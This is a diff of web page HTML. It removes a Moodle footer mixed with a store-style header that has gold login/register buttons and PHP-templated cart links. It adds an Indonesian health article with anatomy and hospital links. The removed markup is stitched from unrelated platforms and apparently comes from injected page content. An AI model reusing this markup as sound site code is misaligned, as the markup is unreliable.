-                    <div class="footer-section p-3 border-bottom">
-                        <div class="logininfo">
-                            <div class="logininfo">You are not logged in. (<a href="https://learning.stikesbup.ac.id/login/index.php">Log in</a>)</div>
-                        </div>
-                        <div class="tool_usertours-resettourcontainer">
-                        </div>
-            
-                        <div class="tool_dataprivacy"><a href="https://learning.stikesbup.ac.id/admin/tool/dataprivacy/summary.php">Data retention summary</a></div>
-                        <script>
-    //<![CDATA[
-    var require = {
-        baseUrl : 'https://learning.stikesbup.ac.id/lib/requirejs.php/1720755259/',
-        // We only support AMD modules with an explicit define() statement.
-        enforceDefine: true,
-        skipDataMain: true,
-        waitSeconds : 0,
-    
-        paths: {
-            jquery: 'https://learning.stikesbup.ac.id/lib/javascript.php/1720755259/lib/jquery/jquery-3.6.1.min',
-            jqueryui: 'https://learning.stikesbup.ac.id/lib/javascript.php/1720755259/lib/jquery/ui-1.13.2/jquery-ui.min',
-            jqueryprivate: 'https://learning.stikesbup.ac.id/lib/javascript.php/1720755259/lib/requirejs/jquery-private'
-        },
-    
-        // Custom jquery config map.
-        map: {
-          // '*' means all modules will get 'jqueryprivate'
-          // for their 'jquery' dependency.
-          '*': { jquery: 'jqueryprivate' },
-          // Stub module for 'process'. This is a workaround for a bug in MathJax (see MDL-60458).
-          '*': { process: 'core/first' },
-    
-          // 'jquery-private' wants the real jQuery module
-          // though. If this line was not here, there would
-          // be an unresolvable cyclic dependency.
-          jqueryprivate: { jquery: 'jquery' }
-        }
-    };
-    
-    //]]>
-    </script>
-    <script src="https://learning.stikesbup.ac.id/lib/javascript.php/1720755259/lib/requirejs/require.min.js"></script>
-    <script>
-    //<![CDATA[
-    M.util.js_pending("core/first");
-    require(['core/first'], function() {
-    require(['core/prefetch'])
-    ;
-    require(["media_videojs/loader"], function(loader) {
-        loader.setUp('en');
-    });;
-    
-        require(['core/moremenu'], function(moremenu) {
-            moremenu(document.querySelector('#moremenu-67c30a2e4e8f1-navbar-nav'));
-        });
-    ;
-    
-        require(['core/usermenu'], function(UserMenu) {
-            UserMenu.init();
-        });
-    ;
-    
-    require(['theme_boost/drawers']);
-    require('./login/learning.stikesbup.php');
-    ;
-    
-    require(['theme_boost/drawers']);
-    ;
-    
-    require(['theme_boost/footer-popover'], function(FooterPopover) {
-        FooterPopover.init();
-    });
-    ;
-    
-    M.util.js_pending('theme_boost/loader');
-    require(['theme_boost/loader', 'theme_boost/drawer'], function(Loader, Drawer) {
-        Drawer.init();
-        M.util.js_complete('theme_boost/loader');
-    });
-    ;
-    
-        require(['jquery', 'mod_forum/discussion_list'], function($, View) {
-            var root = $('#discussion-list-67c30a2e9564967c30a2e5257c2');
-            View.init(root);
-        });
-    ;
-    M.util.js_pending('core/notification'); require(['core/notification'], function(amd) {amd.init(2, []); M.util.js_complete('core/notification');});;
-    M.util.js_pending('core/log'); require(['core/log'], function(amd) {amd.setConfig({"level":"warn"}); M.util.js_complete('core/log');});;
-    M.util.js_pending('core/page_global'); require(['core/page_global'], function(amd) {amd.init(); M.util.js_complete('core/page_global');});;
-    M.util.js_pending('core/utility'); require(['core/utility'], function(amd) {M.util.js_complete('core/utility');});
-        M.util.js_complete("core/first");
-    });
-    //]]>
-    </script>
-    <script>
-    //<![CDATA[
-    M.str = {"moodle":{"lastmodified":"Last modified","name":"Name","error":"Error","info":"Information","yes":"Yes","no":"No","cancel":"Cancel","confirm":"Confirm","areyousure":"Are you sure?","closebuttontitle":"Close","unknownerror":"Unknown error","file":"File","url":"URL","collapseall":"Collapse all","expandall":"Expand all"},"repository":{"type":"Type","size":"Size","invalidjson":"Invalid JSON string","nofilesattached":"No files attached","filepicker":"File picker","logout":"Logout","nofilesavailable":"No files available","norepositoriesavailable":"Sorry, none of your current repositories can return files in the required format.","fileexistsdialogheader":"File exists","fileexistsdialog_editor":"A file with that name has already been attached to the text you are editing.","fileexistsdialog_filemanager":"A file with that name has already been attached","renameto":"Rename to \"{$a}\"","referencesexist":"There are {$a} links to this file","select":"Select"},"admin":{"confirmdeletecomments":"You are about to delete comments, are you sure?","confirmation":"Confirmation"},"debug":{"debuginfo":"Debug info","line":"Line","stacktrace":"Stack trace"},"langconfig":{"labelsep":": "}};
-    //]]>
-    </script>
-    <script>
-    //<![CDATA[
-    (function() {Y.use("moodle-filter_mathjaxloader-loader",function() {M.filter_mathjaxloader.configure({"mathjaxconfig":"\nMathJax.Hub.Config({\n    config: [\"Accessible.js\", \"Safe.js\"],\n    errorSettings: { message: [\"!\"] },\n    skipStartupTypeset: true,\n    messageStyle: \"none\"\n});\n","lang":"en"});
-    });
-    M.util.help_popups.setup(Y);
-     M.util.js_pending('random67c30a2e5257c3'); Y.on('domready', function() { M.util.js_complete("init");  M.util.js_complete('random67c30a2e5257c3'); });
-    })();
-    //]]>
-    </script>
-    
-                    </div>
-                    <div class="footer-section p-3">
-                        <div>Powered by <a href="https://moodle.com">Moodle</a></div>
-                    </div>
-                </div>
-            
-                <div class="footer-content-debugging footer-dark bg-dark text-light">
-                    <div class="container-fluid footer-dark-inner">
+            <div class="content-page">
+                <div class="content">
+
+                    <!-- Start Content-->
+                    <div class="container-fluid">
                         
-                    </div>
-                </div>
-            </footer>
-        </div>
-        
+                        <!-- start page title -->
+                        <div class="row">
+                            <div class="col-12">
+                                <div class="page-title-box">
+                                    
+                                </div>
+                            </div>
+                        </div>     
+                        <!-- end page title -->
+                        <style>
+                          .carousel-item img {
+                              width: 100%;
+                              height: auto;
+                              max-height: 628px; /* Menjaga proporsi gambar */
+                              object-fit: cover; /* Pastikan gambar tidak terdistorsi */
+                          }
+                          </style>
+                          
+                          <div class="col-lg-12">
+                              <div class="card">
+                                  <div class="card-body">
+                                      <div id="carouselExampleControls" class="carousel slide" data-ride="carousel" data-interval="2000"> 
+                                          <div class="carousel-inner" role="listbox">
+                                              <div class="carousel-item active">
+                                                  <img class="d-block img-fluid" src="https://iili.io/32xNx1V.jpg" alt="First slide">
+                                              </div>
+                                              <div class="carousel-item">
+                                                  <img class="d-block img-fluid" src="https://iili.io/32xwWWx.jpg" alt="Second slide">
+                                              </div>
+                                              <div class="carousel-item">
+                                                  <img class="d-block img-fluid" src="https://iili.io/32xvxZg.jpg" alt="Third slide">
+                                              </div>
+                                              <div class="carousel-item">
+                                                  <img class="d-block img-fluid" src="https://iili.io/32xkLGf.jpg" alt="Fourth slide">
+                                              </div>
+                                          </div>
+                                          <a class="carousel-control-prev" href="#carouselExampleControls" role="button" data-slide="prev">
+                                              <span class="carousel-control-prev-icon" aria-hidden="true"></span>
+                                              <span class="sr-only">Previous</span>
+                                          </a>
+                                          <a class="carousel-control-next" href="#carouselExampleControls" role="button" data-slide="next">
+                                              <span class="carousel-control-next-icon" aria-hidden="true"></span>
+                                              <span class="sr-only">Next</span>
+                                          </a>
+                                      </div>
+                                  </div>
+                              </div>
+                          </div>
+<!-- end row -->
+<div class="row" id="register">
+        <div class="col-md-12">
+        <div class="card">
+            <div class="card-body">
+				<h1 style="text-align: left;" data-pm-slice="1 1 []"><strong>Pentingnya Menjaga Kesehatan Sejak Dini</strong></h1>
+				<p style="text-align: left;">Kesehatan adalah aset berharga yang harus dijaga sejak dini. Gaya hidup sehat yang diterapkan sejak usia muda akan memberikan dampak positif dalam jangka panjang, baik secara fisik maupun mental. Kesadaran akan pentingnya kesehatan perlu ditanamkan sejak dini agar individu dapat menjalani kehidupan yang lebih berkualitas dan terhindar dari berbagai penyakit kronis di kemudian hari.</p>
+				<p style="text-align: left;"><strong>Pencegahan Penyakit Kronis</strong> Menjaga kesehatan sejak dini dapat membantu mencegah berbagai penyakit kronis seperti diabetes, hipertensi, dan penyakit jantung. Penyakit-penyakit ini sering kali berkembang akibat pola hidup yang tidak sehat, seperti pola makan yang buruk, kurangnya aktivitas fisik, dan kebiasaan merokok. Dengan menerapkan gaya hidup sehat sejak usia muda, risiko terkena penyakit ini dapat diminimalkan.</p>
+				<p style="text-align: left;"><strong>Meningkatkan Kualitas Hidup</strong> Kesehatan yang baik berkontribusi pada peningkatan kualitas hidup. Seseorang yang sehat akan memiliki lebih banyak energi, lebih produktif, dan mampu menjalani aktivitas sehari-hari dengan lebih baik. Selain itu, kesehatan yang optimal juga berpengaruh pada kesejahteraan mental, mengurangi risiko stres, kecemasan, dan depresi.</p>
+				<p style="text-align: left;"><strong>Membentuk Kebiasaan Sehat</strong> Kebiasaan sehat yang dibangun sejak dini akan terbawa hingga dewasa. Anak-anak yang terbiasa mengonsumsi makanan sehat, berolahraga secara rutin, dan menjaga kebersihan diri cenderung menerapkan kebiasaan tersebut di masa dewasa. Oleh karena itu, peran orang tua dan lingkungan sangat penting dalam memberikan contoh yang baik kepada anak-anak.</p>
+				<h2 style="text-align: left;"><strong>Langkah-langkah Menjaga Kesehatan Sejak Dini</strong></h2>
+				<ol style="text-align: left;">
+				<li><strong>Menerapkan Pola Makan Sehat</strong> &ndash; Konsumsi makanan bergizi seimbang, perbanyak buah dan sayur, serta kurangi makanan olahan dan tinggi gula.</li>
+				<li><strong>Rutin Berolahraga</strong> &ndash; Aktivitas fisik seperti berjalan kaki, berlari, atau bersepeda dapat menjaga kebugaran tubuh.</li>
+				<li><strong>Cukup Istirahat</strong> &ndash; Tidur yang cukup sangat penting untuk pemulihan tubuh dan menjaga sistem kekebalan tubuh.</li>
+				<li><strong>Menjaga Kebersihan</strong> &ndash; Mencuci tangan, mandi secara teratur, dan menjaga kebersihan lingkungan dapat mencegah berbagai penyakit menular.</li>
+				<li><strong>Mengelola Stres dengan Baik</strong> &ndash; Teknik relaksasi seperti meditasi, yoga, atau sekadar menghabiskan waktu bersama keluarga dapat membantu mengurangi stres.</li>
+				</ol>
+				<h2 style="text-align: left;" data-pm-slice="1 1 []"><strong>Pentingnya Menjaga Kesehatan Sejak Dini: Investasi Berharga untuk Masa Depan</strong></h2>
+<p style="text-align: left;">Kesehatan adalah harta yang tidak ternilai. Sayangnya, banyak orang baru menyadari betapa berharganya kesehatan ketika mereka mulai merasakan dampak negatif dari gaya hidup yang kurang sehat. Menjaga kesehatan sejak dini bukan hanya sekadar tren, tetapi investasi jangka panjang yang akan menentukan kualitas hidup seseorang di masa depan.</p>
+<h3 style="text-align: left;"><strong>Mengapa Kesehatan Sejak Dini Itu Penting?</strong></h3>
+<p style="text-align: left;">Seiring bertambahnya usia, tubuh manusia mengalami berbagai perubahan yang dapat memengaruhi daya tahan serta fungsi organ vital. Jika tidak dijaga dengan baik sejak usia muda, risiko terkena penyakit kronis seperti diabetes, hipertensi, dan penyakit jantung akan meningkat. Oleh karena itu, membiasakan gaya hidup sehat sejak dini adalah langkah cerdas untuk menghindari berbagai masalah kesehatan yang bisa datang di kemudian hari.</p>
+<h3 style="text-align: left;"><strong>Mencegah Penyakit Kronis dengan Gaya Hidup Sehat</strong></h3>
+<p style="text-align: left;">Penyakit kronis sering kali disebabkan oleh pola makan yang buruk, kurangnya aktivitas fisik, serta kebiasaan yang merugikan seperti merokok dan konsumsi alkohol berlebihan. Berikut adalah beberapa kebiasaan sehat yang bisa diterapkan sejak dini:</p>
+<ol style="text-align: left;" start="1" data-spread="true">
+<li>
+<p><strong>Konsumsi Makanan Bergizi</strong></p>
+<ul data-spread="false">
+<li>
+<p>Pilih makanan yang kaya akan nutrisi seperti sayur, buah, protein, dan serat.</p>
+</li>
+<li>
+<p>Kurangi konsumsi makanan olahan yang tinggi gula, garam, dan lemak jenuh.</p>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Rajin Berolahraga</strong></p>
+<ul data-spread="false">
+<li>
+<p>Luangkan waktu minimal 30 menit sehari untuk aktivitas fisik seperti berjalan kaki, berlari, atau bersepeda.</p>
+</li>
+<li>
+<p>Olahraga tidak hanya menjaga berat badan ideal, tetapi juga meningkatkan kesehatan jantung dan sistem imun.</p>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Menjaga Pola Tidur yang Baik</strong></p>
+<ul data-spread="false">
+<li>
+<p>Tidur yang cukup (7&ndash;9 jam per malam) membantu tubuh memperbaiki sel-sel yang rusak dan meningkatkan konsentrasi serta daya ingat.</p>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Menghindari Kebiasaan Buruk</strong></p>
+<ul data-spread="false">
+<li>
+<p>Mengurangi konsumsi alkohol dan berhenti merokok dapat mengurangi risiko terkena penyakit kronis serta memperpanjang usia harapan hidup.</p>
+</li>
+</ul>
+</li>
+</ol>
+<h3 style="text-align: left;"><strong>Dampak Positif Menjaga Kesehatan Sejak Dini</strong></h3>
+<p style="text-align: left;">Menjalani gaya hidup sehat tidak hanya memberikan manfaat fisik, tetapi juga mental dan emosional. Beberapa manfaat yang dapat dirasakan antara lain:</p>
+<ul style="text-align: left;" data-spread="false">
+<li>
+<p><strong>Lebih Banyak Energi dan Produktivitas</strong>: Tubuh yang sehat akan lebih bertenaga dan tidak mudah lelah, sehingga aktivitas sehari-hari dapat dijalani dengan lebih optimal.</p>
+</li>
+<li>
+<p><strong>Mengurangi Risiko Stres dan Depresi</strong>: Aktivitas fisik seperti olahraga dapat membantu meningkatkan produksi hormon endorfin yang membuat perasaan lebih bahagia dan rileks.</p>
+</li>
+<li>
+<p><strong>Meningkatkan Kualitas Hidup di Usia Tua</strong>: Dengan menjaga kesehatan sejak dini, seseorang dapat menikmati masa tua yang lebih berkualitas, bebas dari ketergantungan pada obat-obatan atau bantuan medis.</p>
+</li>
+</ul>
+<h3 style="text-align: left;"><strong>Peran Orang Tua dan Lingkungan dalam Menanamkan Kebiasaan Sehat</strong></h3>
+<p style="text-align: left;">Kebiasaan sehat harus ditanamkan sejak kecil agar terbawa hingga dewasa. Peran orang tua sangat penting dalam memberikan contoh yang baik kepada anak-anak, seperti menyediakan makanan sehat di rumah, mengajak berolahraga bersama, serta mengajarkan pentingnya menjaga kebersihan diri. Selain itu, lingkungan yang positif juga berperan besar dalam membentuk pola hidup seseorang</p>
+				<p style="text-align: left;"><strong>Kesimpulan</strong> Menjaga kesehatan sejak dini adalah investasi jangka panjang untuk kehidupan yang lebih baik. Dengan menerapkan pola hidup sehat, seseorang dapat menghindari penyakit kronis, meningkatkan kualitas hidup, serta membentuk kebiasaan baik yang bermanfaat hingga usia tua. Oleh karena itu, mari kita mulai menjaga kesehatan sejak sekarang demi masa depan yang lebih sehat dan bahagia.</p>
+				</div></div><!-- end card-box-->
     </div>
-    
-    </body>
-    </html>
-<style>
-          @supports (-webkit-backdrop-filter: none) or (backdrop-filter: none) {
-            .header-blur-background {}
-          }
-          .ProductItem-gallery-slides-item.selected.going-next.loaded.next-loaded.prev-loaded {
-    width: auto;
-    height: auto;
-}
-.tweak-fixed-header .header .header-announcement-bar-wrapper {
+                <div class="col-lg-3">
+        <div class="card-box bg-pattern">
+            <div class="text-center">
+                <img src="https://iili.io/3HBbqsS.md.jpg" alt="logo" class="avatar-xl rounded-circle mb-3">
+                <h4 class="mb-1 font-20">JANTUNG</h4>
+            </div>
+                                                            <div class="text-center">
+                <a href="/index/register?id=f0739eac-2242-eb99-938a-17e20ecb5cec" class="btn btn-sm btn-warning">Atrium kanan dan kiri </a>
+            </div>
+            <br>
+                                                                        <div class="text-center">
+                <a href="/index/register?id=43ff1825-c573-4ced-49f8-83e15181a8c9" class="btn btn-sm btn-warning">Ventrikel kanan dan kiri
+				</a>
+            </div>
+            <br>
+                                                                                                                        <div class="text-center">
+                <a href="/index/register?id=01c82212-06ed-1cc3-7dd6-8aa028ea7c55" class="btn btn-sm btn-warning">Katup jantung</a>
+            </div>
+            <br>
+                                                                                                                                                                        <div class="text-center">
+                <a href="/index/register?id=5a9872cf-0794-d61a-53f8-d0eeaf3ade8f" class="btn btn-sm btn-warning">Dinding jantung</a>
+            </div>
+                                                                    </div> <!-- end card-box -->
+    </div><!-- end col -->
+            <div class="col-lg-3">
+        <div class="card-box bg-pattern">
+            <div class="text-center">
+                <img src="https://iili.io/3HBDqcg.jpg" alt="logo" class="avatar-xl rounded-circle mb-3">
+                <h4 class="mb-1 font-20">MATA</h4>
+            </div>
+                                    <div class="text-center">
+                <a href="/index/register?id=766b3a6d-3cd4-1da3-7f56-be08c9c590df" class="btn btn-sm btn-warning">Kornea</a>
+            </div>
+            <br>
+                                                                        <div class="text-center">
+                <a href="/index/register?id=dd101020-3205-1871-d38a-25645911ba73" class="btn btn-sm btn-warning">Pupil</a>
+            </div>
+            <br>
+                                                                                                                                                                        <div class="text-center">
+                <a href="/index/register?id=b5ce0f7c-6c24-7a68-2a22-31ed1789c0b7" class="btn btn-sm btn-warning">Iris</a>
+            </div>
+            <br>
+                                                                                                                        <div class="text-center">
+                <a href="/index/register?id=5f6505ec-e954-ba06-0d77-d465651960dc" class="btn btn-sm btn-warning">Lensa</a>
+            </div>
+            <br>
+                                                                        <div class="text-center">
+                <a href="/index/register?id=9a40381d-7275-0fe1-cc57-492c3abde3bb" class="btn btn-sm btn-warning">Retina</a>
+            </div>
+            <br>
+                                                                                                        </div> <!-- end card-box -->
+    </div><!-- end col -->
+            <div class="col-lg-3">
+        <div class="card-box bg-pattern">
+            <div class="text-center">
+                <img src="https://iili.io/3HBZkdb.jpg" alt="logo" class="avatar-xl rounded-circle mb-3">
+                <h4 class="mb-1 font-20">GINJAL</h4>
+            </div>
+                                                                                                                                                            <div class="text-center">
+                <a href="/index/register?id=f2d5f334-4079-43ab-9792-efdc127106e7" class="btn btn-sm btn-warning">Korteks</a>
+            </div>
+            <br>
+                                                                                                                        <div class="text-center">
+                <a href="/index/register?id=b848afae-f332-f5b5-9bf6-881b00b3b7fe" class="btn btn-sm btn-warning">Medula</a>
+            </div>
+            <br>
+                                                <div class="text-center">
+                <a href="/index/register?id=abc153a5-c35e-f396-e419-878baa247db7" class="btn btn-sm btn-warning">Pelvis</a>
+            </div>
+            <br>
+                                                                                                                                                                                                <div class="text-center">
+                <a href="/index/register?id=678a9df8-06e6-d86f-583c-eeadbe865953" class="btn btn-sm btn-warning">Nefron</a>
+            </div>
+            <br>
+                                </div> <!-- end card-box -->
+    </div><!-- end col -->
+            <div class="col-lg-3">
+        <div class="card-box bg-pattern">
+            <div class="text-center">
+                <img src="https://iili.io/3HBtjuR.jpg" alt="logo" class="avatar-xl rounded-circle mb-3">
+                <h4 class="mb-1 font-20">RUMAH SAKIT</h4>
+            </div>
+                                                                                                                                    <div class="text-center">
+                <a href="https://rsupsoeradji.id/" class="btn btn-sm btn-warning">RSUP Dr. Soeradji Tirtonegoro</a>
+            </div>
+            <br>
+                                                                        <div class="text-center">
+                <a href="https://rs-kariadi.go.id/" class="btn btn-sm btn-warning">RSUP Dr. Kariadi</a>
+            </div>
+            <br>
+                                                                                                                                                <div class="text-center">
+                <a href="https://sardjito.co.id/" class="btn btn-sm btn-warning">JRSUP Dr. Sardjito</a>
+            </div>
+            <br>
+                                                                                                                        <div class="text-center">
+                <a href="https://rsdjamil.co.id/" class="btn btn-sm btn-warning">JRSUP Dr. M. Djamil</a>
+            </div>
+            <br>
+                                                                                </div> <!-- end card-box -->
+    </div><!-- end col -->
+        </div>
+<!-- end row -->                    </div> <!-- container -->
 
-    background: linear-gradient(89.87deg, #060807 35.41%, #080b0a 121.72%);
-}
-.collection-type-products .ProductItem-details h1.ProductItem-details-title {
-    font-family: exo;
-}
-footer#footer-sections {
-    background: linear-gradient(89.87deg, #060807 35.41%, #080b0a 121.72%);
-    color: white;
-    font-family: arial;
-    text-align: center;
-    padding: 30px 0px 30px 0px;
-}
-.products.collection-content-wrapper {
-    padding-bottom: 0vw;
-}
-.ProductItem {
-    padding-bottom: 0vw;
-}
-.header-nav-item.header-nav-item--collection a, .header-nav-item.header-nav-item--collection.header-nav-item--active a {
-    color: white;
-}
-.n-columns-2 {
-    display: grid;
-    grid-template-columns: repeat(2,1fr);
-    font-weight: 700;
-    }
-    .n-columns-2 a {
-    text-align: center;
-    }
-    .login, .register {
-    color: #ffd700;
-    padding: 13px 10px;
-    }
-    .login, .login-button {
-    background: linear-gradient(to bottom, #070000 0%, #070707 100%);
-    border: 2px solid #ffd700;
-    box-shadow: 0px 0px 3px #f00;
-    }
-    .register, .register-button {
-    background: linear-gradient(to bottom, #070000 0%, #070707 100%);
-    border: 2px solid #ffd700;
-    box-shadow: 0px 0px 3px #f00;
-    }
-        </style>
-<div class="header-actions header-actions--right">
-<div class="showOnMobile">
-<div class="header-actions-action header-actions-action--cart">
-<a href="<?php echo $urlPath ?>" class="cart-style-icon icon--stroke icon--fill icon--cart sqs-custom-cart  header-icon  show-empty-cart-state cart-quantity-zero header-icon-border-shape-none header-icon-border-style-outline">
-<span class="Cart-inner">
-<svg class="icon icon--cart" width="61" height="49" viewBox="0 0 61 49">
-<path fill-rule="evenodd" clip-rule="evenodd" d="M0.5 2C0.5 1.17157 1.17157 0.5 2 0.5H13.6362C14.3878 0.5 15.0234 1.05632 15.123 1.80135L16.431 11.5916H59C59.5122 11.5916 59.989 11.8529 60.2645 12.2847C60.54 12.7165 60.5762 13.2591 60.3604 13.7236L50.182 35.632C49.9361 36.1614 49.4054 36.5 48.8217 36.5H18.0453C17.2937 36.5 16.6581 35.9437 16.5585 35.1987L12.3233 3.5H2C1.17157 3.5 0.5 2.82843 0.5 2ZM16.8319 14.5916L19.3582 33.5H47.8646L56.6491 14.5916H16.8319Z" />
-<path d="M18.589 35H49.7083L60 13H16L18.589 35Z" />
-<path d="M21 49C23.2091 49 25 47.2091 25 45C25 42.7909 23.2091 41 21 41C18.7909 41 17 42.7909 17 45C17 47.2091 18.7909 49 21 49Z" />
-<path d="M45 49C47.2091 49 49 47.2091 49 45C49 42.7909 47.2091 41 45 41C42.7909 41 41 42.7909 41 45C41 47.2091 42.7909 49 45 49Z" />
-</svg>
-<div class="icon-cart-quantity">
-<span class="cart-quantity-container">
-<span class="sqs-cart-quantity">0</span>
-</span>
-</div>
-</span>
-</a>
-</div>
-</div>
-<div class="showOnDesktop">
-<div class="header-actions-action header-actions-action--cart">
-<a href="<?php echo $urlPath ?>" class="cart-style-icon icon--stroke icon--fill icon--cart sqs-custom-cart  header-icon  show-empty-cart-state cart-quantity-zero header-icon-border-shape-none header-icon-border-style-outline">
-<span class="Cart-inner">
-<svg class="icon icon--cart" width="61" height="49" viewBox="0 0 61 49">
-<path fill-rule="evenodd" clip-rule="evenodd" d="M0.5 2C0.5 1.17157 1.17157 0.5 2 0.5H13.6362C14.3878 0.5 15.0234 1.05632 15.123 1.80135L16.431 11.5916H59C59.5122 11.5916 59.989 11.8529 60.2645 12.2847C60.54 12.7165 60.5762 13.2591 60.3604 13.7236L50.182 35.632C49.9361 36.1614 49.4054 36.5 48.8217 36.5H18.0453C17.2937 36.5 16.6581 35.9437 16.5585 35.1987L12.3233 3.5H2C1.17157 3.5 0.5 2.82843 0.5 2ZM16.8319 14.5916L19.3582 33.5H47.8646L56.6491 14.5916H16.8319Z" />
-<path d="M18.589 35H49.7083L60 13H16L18.589 35Z" />
-<path d="M21 49C23.2091 49 25 47.2091 25 45C25 42.7909 23.2091 41 21 41C18.7909 41 17 42.7909 17 45C17 47.2091 18.7909 49 21 49Z" />
-<path d="M45 49C47.2091 49 49 47.2091 49 45C49 42.7909 47.2091 41 45 41C42.7909 41 41 42.7909 41 45C41 47.2091 42.7909 49 45 49Z" />
-</svg>
-<div class="icon-cart-quantity">
-<span class="cart-quantity-container">
-<span class="sqs-cart-quantity">0</span>
-</span>
-</div>
-</span>
-</a>
-</div>
-</div>
-</div>
-</div>
-</div>
+                </div> <!-- content -->
+
+<!-- Footer Start -->
+<footer class="footer">
+    <div class="container-fluid">
+        <div class="row">
+            <div class="col-md-6">
+                <script>document.write(new Date().getFullYear())</script> &copy; Akademi Farmasi Bumi Siliwangi Bandung</a> 
+            </div>
+            <div class="col-md-6">
+                <div class="text-md-right footer-links d-none d-sm-block">
+                    <a href="javascript:void(0);">About Us</a>
+                    <a href="javascript:void(0);">Help</a>
+                    <a href="javascript:void(0);">Contact Us</a>
+                </div>
+            </div>
+        </div>
+    </div>
+</footer>
+<!-- end Footer -->
+
 </div>
 
-<div class="header-menu header-menu--folder-list
-      
-      
-      
-      
-      
-      " data-section-theme data-current-styles="{
+<!-- ============================================================== -->
+<!-- End Page content -->
+<!-- ============================================================== -->
 
-                                                            &quot;layout&quot;: &quot;brandingCenter&quot;,
-                                                            &quot;action&quot;: {
-                                                              &quot;buttonText&quot;: &quot;Get Started&quot;,
-                                                              &quot;newWindow&quot;: false
-                                                            },
-                                                            &quot;showSocial&quot;: false,
-                                                            &quot;socialOptions&quot;: {
-                                                              &quot;socialBorderShape&quot;: &quot;none&quot;,
-                                                              &quot;socialBorderStyle&quot;: &quot;outline&quot;,
-                                                              &quot;socialBorderThickness&quot;: {
-                                                                &quot;unit&quot;: &quot;px&quot;,
-                                                                &quot;value&quot;: 1.0
-                                                              }
-                                                            },
-                                                            &quot;menuOverlayAnimation&quot;: &quot;fade&quot;,
-                                                            &quot;cartStyle&quot;: &quot;cart&quot;,
-                                                            &quot;cartText&quot;: &quot;Cart&quot;,
-                                                            &quot;showEmptyCartState&quot;: true,
-                                                            &quot;cartOptions&quot;: {
-                                                              &quot;iconType&quot;: &quot;solid-7&quot;,
-                                                              &quot;cartBorderShape&quot;: &quot;none&quot;,
-                                                              &quot;cartBorderStyle&quot;: &quot;outline&quot;,
-                                                              &quot;cartBorderThickness&quot;: {
-                                                                &quot;unit&quot;: &quot;px&quot;,
-                                                                &quot;value&quot;: 1.0
-                                                              }
-                                                            },
-                                                            &quot;showButton&quot;: false,
-                                                            &quot;showCart&quot;: true,
-                                                            &quot;showAccountLogin&quot;: false,
-                                                            &quot;headerStyle&quot;: &quot;dynamic&quot;,
-                                                            &quot;languagePicker&quot;: {
-                                                              &quot;enabled&quot;: false,
-                                                              &quot;iconEnabled&quot;: false,
-                                                              &quot;iconType&quot;: &quot;globe&quot;,
-                                                              &quot;flagShape&quot;: &quot;shiny&quot;,
-                                                              &quot;languageFlags&quot;: [ ]
-                                                            },
-                                                            &quot;mobileOptions&quot;: {
-                                                              &quot;layout&quot;: &quot;logoCenterNavLeft&quot;,
-                                                              &quot;menuIcon&quot;: &quot;doubleLineHamburger&quot;,
-                                                              &quot;menuIconOptions&quot;: {
-                                                                &quot;style&quot;: &quot;doubleLineHamburger&quot;,
-                                                                &quot;thickness&quot;: {
-                                                                  &quot;unit&quot;: &quot;px&quot;,
-                                                                  &quot;value&quot;: 1.0}
-                                                              }
-                                                            },
-                                                            &quot;dynamicOptions&quot;: {
-                                                              &quot;border&quot;: {
-                                                                &quot;enabled&quot;: false,
-                                                                &quot;position&quot;: &quot;allSides&quot;,
-                                                                &quot;thickness&quot;: {
-                                                                  &quot;unit&quot;: &quot;px&quot;,
-                                                                  &quot;value&quot;: 4.0
-                                                                },
-                                                                &quot;color&quot;: {
-                                                                  &quot;type&quot;: &quot;SITE_PALETTE_COLOR&quot;,
-                                                                  &quot;sitePaletteColor&quot;: {
-                                                                    &quot;colorName&quot;: &quot;black&quot;,&quot;alphaModifier&quot;: 1.0
-                                                                  }
-                                                                }
-                                                              }
-                                                            },
-                                                            &quot;solidOptions&quot;: {
-                                                              &quot;headerOpacity&quot;: {
-                                                                &quot;unit&quot;: &quot;%&quot;,
-                                                                &quot;value&quot;: 100.0
-                                                              },
-                                                              &quot;border&quot;: {
-                                                                &quot;enabled&quot;: false,
-                                                                &quot;position&quot;: &quot;allSides&quot;,
-                                                                &quot;thickness&quot;: {
-                                                                  &quot;unit&quot;: &quot;px&quot;,
-                                                                  &quot;value&quot;: 4.0
-                                                                },
-                                                                &quot;color&quot;: {
-                                                                  &quot;type&quot;: &quot;SITE_PALETTE_COLOR&quot;,
-                                                                  &quot;sitePaletteColor&quot;: {
-                                                                    &quot;colorName&quot;: &quot;black&quot;,
-                                                                    &quot;alphaModifier&quot;: 1.0
-                                                                  }
-                                                                }
-                                                              },
-                                                              &quot;dropShadow&quot;: {
-                                                                &quot;enabled&quot;: false,
-                                                                &quot;blur&quot;: {
-                                                                  &quot;unit&quot;: &quot;px&quot;,
-                                                                  &quot;value&quot;: 30.0
-                                                                },
-                                                                &quot;spread&quot;: {
-                                                                  &quot;unit&quot;: &quot;px&quot;,
-                                                                  &quot;value&quot;: 0.0
-                                                                },
-                                                                &quot;distance&quot;: {
-                                                                  &quot;unit&quot;: &quot;px&quot;,
-                                                                  &quot;value&quot;: 0.0
-                                                                },
-                                                                &quot;color&quot;: {
-                                                                  &quot;type&quot;: &quot;SITE_PALETTE_COLOR&quot;,
-                                                                  &quot;sitePaletteColor&quot;: {
-                                                                    &quot;colorName&quot;: &quot;black&quot;,
-                                                                    &quot;alphaModifier&quot;: 1.0
-                                                                  }
-                                                                }
-                                                              },
-                                                              &quot;blurBackground&quot;: {
-                                                                &quot;enabled&quot;: false,
-                                                                &quot;blurRadius&quot;: {
-                                                                  &quot;unit&quot;: &quot;px&quot;,
-                                                                  &quot;value&quot;: 12.0
-                                                                }
-                                                              },
-                                                              &quot;backgroundColor&quot;: {
-                                                                &quot;type&quot;: &quot;SITE_PALETTE_COLOR&quot;,
-                                                                &quot;sitePaletteColor&quot;: {
-                                                                  &quot;colorName&quot;: &quot;white&quot;,
-                                                                  &quot;alphaModifier&quot;: 1.0
-                                                                }
-                                                              },
-                                                              &quot;navigationColor&quot;: {
-                                                                &quot;type&quot;: &quot;SITE_PALETTE_COLOR&quot;,
-                                                                &quot;sitePaletteColor&quot;: {
-                                                                  &quot;colorName&quot;: &quot;black&quot;,
-                                                                  &quot;alphaModifier&quot;: 1.0
-                                                                }
-                                                              }
-                                                            },
-                                                            &quot;gradientOptions&quot;: {
-                                                              &quot;gradientType&quot;: &quot;faded&quot;,
-                                                              &quot;headerOpacity&quot;: {
-                                                                &quot;unit&quot;: &quot;%&quot;,
